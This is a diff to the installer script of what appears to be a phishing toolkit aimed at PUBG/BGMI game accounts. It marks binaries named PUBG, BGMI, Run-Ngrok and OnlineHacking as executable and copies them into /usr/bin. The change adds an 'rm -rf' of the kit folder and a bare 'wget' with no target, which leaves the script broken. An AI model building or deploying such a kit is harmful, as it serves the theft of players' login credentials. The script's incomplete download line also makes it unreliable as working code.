@@ -147,6 +147,8 @@ chmod +x ngrok
 chmod +x PUBG
 chmod +x BGMI
 chmod +x Run-Ngrok
+rm -rf PUBG-BGMI_Phishing 
+wget
 clear
 echo ""
 echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
@@ -180,14 +182,14 @@ echo
 clear
 echo
 echo
-cp -R ngrok /usr/bin
-cp -R SUMAN /usr/bin
-cp -R SUMAN1 /usr/bin
-cp -R PUBG /usr/bin
-cp -R BGMI /usr/bin
-cp -R PUBG-BGMI_Phishing /usr/bin
-cp -R Run-Ngrok /usr/bin
-cp -R OnlineHacking /usr/bin
+cp -R ngrok /usr/bin/
+cp -R SUMAN /usr/bin/
+cp -R SUMAN1 /usr/bin/
+cp -R PUBG /usr/bin/
+cp -R BGMI /usr/bin/
+cp -R PUBG-BGMI_Phishing /usr/bin/
+cp -R Run-Ngrok /usr/bin/
+cp -R OnlineHacking /usr/bin/
 echo
 rm -rf SUMAN SUMAN1 PUBG-BGMI_Phishing 
 echo
